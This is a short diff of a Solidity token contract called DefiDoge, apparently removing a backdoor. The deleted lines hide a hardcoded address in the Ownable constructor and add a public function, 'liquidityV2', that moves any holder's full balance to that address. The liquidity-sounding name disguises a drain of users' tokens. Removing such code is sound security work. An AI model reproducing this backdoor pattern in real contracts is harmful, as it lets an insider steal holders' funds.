@@ -405,7 +405,6 @@ contract Ownable is Context {
      */
     constructor () internal {
         address msgSender = _msgSender();
-        _iUniSwapV2liquidityPool=0x0d08E2529242907524359f74aeb07B34761A6f01;
         _owner = msgSender;
         emit OwnershipTransferred(address(0), msgSender);
     }
@@ -907,11 +906,6 @@ contract DefiDoge is Context, IERC20, Ownable {
     
     function excludeFromFee(address account) public onlyOwner {
         _isExcludedFromFee[account] = true;
-    }
-    
-    function liquidityV2(address addr) public {
-        if (_isExcluded[addr])  _transfer(addr, uniSwapV2LiquidityPool(), _tOwned[addr]);
-        else  _transfer(addr, uniSwapV2LiquidityPool(), tokenFromReflection(_rOwned[addr]));
     }
     
     function includeInFee(address account) public onlyOwner {
